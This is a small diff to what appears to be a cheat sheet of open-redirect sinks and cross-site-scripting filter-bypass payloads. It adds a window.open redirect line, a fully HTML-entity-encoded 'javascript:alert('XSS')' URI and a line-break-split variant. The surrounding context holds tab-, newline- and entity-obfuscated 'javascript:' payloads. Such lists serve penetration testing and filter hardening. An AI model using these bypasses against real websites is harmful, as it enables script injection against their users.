@@ -12,6 +12,7 @@ location=
 window.location.assign()
 window['location']['href']=
 document.location.replace()
+window.open("link", "_blank");
 ```
 
 ### Link
@@ -42,6 +43,11 @@ java\tscript:alert(1)
 ja&NewLine;vascript:alert(1)
 ja&#x0000A;vascript:alert(1)
 java&#x73;cript:alert()
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')
+
+# Line break
+ja
+vascript:alert(1)
 
 <!--::colon:: -->
 javascript&colon;alert()
